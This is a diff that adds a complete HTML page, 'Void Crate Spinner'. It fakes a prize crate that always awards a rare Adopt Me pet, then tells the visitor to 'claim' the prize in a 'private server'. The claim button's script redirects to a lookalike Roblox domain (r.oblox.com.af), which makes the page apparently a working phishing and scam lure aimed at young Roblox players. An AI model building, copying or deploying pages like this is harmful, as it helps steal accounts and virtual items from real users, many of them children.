@@ -1,1 +1,213 @@
-hi
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Void Crate Spinner</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
+
+        body {
+            background: linear-gradient(45deg, #0a001f, #000010);
+            color: white;
+            font-family: 'Orbitron', sans-serif;
+            text-align: center;
+        }
+
+        .container {
+            margin-top: 50px;
+        }
+
+        h1 {
+            font-size: 3em;
+            text-shadow: 0 0 15px cyan;
+        }
+
+        .crate-container {
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 300px;
+        }
+
+        #crate {
+            width: 170px;
+            cursor: pointer;
+            transition: transform 1.5s ease-in-out;
+        }
+
+        .shaking {
+            animation: shake 0.5s ease-in-out;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            50% { transform: translateX(10px); }
+            75% { transform: translateX(-5px); }
+        }
+
+        .spinning {
+            animation: spin 1.5s ease-in-out;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .reward-box {
+            position: absolute;
+            top: -150px;
+            left: 50%;
+            transform: translateX(-50%) scale(0);
+            opacity: 0;
+            transition: transform 0.5s ease-in-out, opacity 0.5s;
+            text-align: center;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 15px;
+            border-radius: 10px;
+            border: 2px solid cyan;
+            box-shadow: 0 0 20px cyan;
+        }
+
+        .reward-box.active {
+            transform: translateX(-50%) scale(1);
+            opacity: 1;
+        }
+
+        .pet-bg {
+            width: 200px;
+            height: 200px;
+            background: radial-gradient(circle, rgba(0,255,255,0.9), rgba(0,0,0,0));
+            border-radius: 50%;
+            position: absolute;
+            top: -30px;
+            left: 50%;
+            transform: translateX(-50%);
+            filter: blur(15px);
+            z-index: -1;
+            animation: glow 1.5s infinite alternate;
+        }
+
+        @keyframes glow {
+            0% { filter: blur(15px) brightness(1); }
+            100% { filter: blur(25px) brightness(1.8); }
+        }
+
+        .pet-image {
+            width: 160px;
+            filter: drop-shadow(0 0 20px cyan);
+        }
+
+        .pet-name {
+            font-size: 24px;
+            margin-top: 10px;
+            text-shadow: 0 0 8px cyan;
+        }
+
+        .btn {
+            background: cyan;
+            color: black;
+            font-size: 18px;
+            padding: 12px 25px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: 0.3s;
+            display: inline-block;
+        }
+
+        .btn:hover {
+            background: magenta;
+            color: white;
+        }
+
+        #claim-btn {
+            display: none;
+        }
+
+        .info-text {
+            font-size: 16px;
+            margin-top: 10px;
+            color: cyan;
+            text-shadow: 0 0 10px cyan;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Void Crate Spinner</h1>
+        <div class="crate-container">
+            <img src="https://cdn3.emoji.gg/emojis/3732-crate-legendary.png" 
+                 alt="Legendary Crate" id="crate">
+            <div class="reward-box" id="reward-box">
+                <div class="pet-bg"></div>
+                <img id="pet-img" class="pet-image" src="" alt="">
+                <div id="pet-name" class="pet-name"></div>
+            </div>
+        </div>
+        <button class="btn" id="open-btn" onclick="spinCrate()">Open</button>
+        <button class="btn" id="claim-btn" onclick="claimReward()">Claim Reward</button>
+        <p class="info-text" id="info-text">Join our private server to claim! Our bot will automatically trade you.</p>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const crate = document.getElementById("crate");
+            const rewardBox = document.getElementById("reward-box");
+            const petImg = document.getElementById("pet-img");
+            const petName = document.getElementById("pet-name");
+            const openBtn = document.getElementById("open-btn");
+            const claimBtn = document.getElementById("claim-btn");
+            const infoText = document.getElementById("info-text");
+
+            const pets = [
+                { name: "Mega Neon Shadow Dragon (Fly, Ride)", img: "https://cdn3.emoji.gg/emojis/5419-shadow-dragon.png" },
+                { name: "Shadow Dragon (Fly, Ride)", img: "https://cdn3.emoji.gg/emojis/5419-shadow-dragon.png" },
+                { name: "Neon Shadow Dragon", img: "https://cdn3.emoji.gg/emojis/5419-shadow-dragon.png" },
+                { name: "Shadow Dragon", img: "https://cdn3.emoji.gg/emojis/5419-shadow-dragon.png" },
+                { name: "Mega Neon Frost Dragon (Fly, Ride)", img: "https://cdn3.emoji.gg/emojis/7908-frost-dragon.png" },
+                { name: "Frost Dragon (Fly, Ride)", img: "https://cdn3.emoji.gg/emojis/7908-frost-dragon.png" }
+            ];
+
+            let isOpening = false;
+
+            window.spinCrate = function() {
+                if (isOpening) return;
+                isOpening = true;
+
+                openBtn.style.display = "none";
+                crate.classList.add("shaking");
+
+                setTimeout(() => {
+                    crate.classList.remove("shaking");
+                    crate.classList.add("spinning");
+
+                    setTimeout(() => {
+                        crate.classList.remove("spinning");
+
+                        let chosenPet = pets[Math.floor(Math.random() * pets.length)];
+
+                        petImg.src = chosenPet.img;
+                        petName.innerHTML = `<b>${chosenPet.name}</b>`;
+
+                        rewardBox.classList.add("active");
+                        claimBtn.style.display = "inline-block";
+                        infoText.style.display = "block";  
+
+                        isOpening = false;
+                    }, 1500);
+                }, 500);
+            };
+
+            window.claimReward = function() {
+                window.location.href = "https://www.r.oblox.com.af/games/920587237/Adopt-Me";
+            };
+        });
+    </script>
+</body>
+</html>
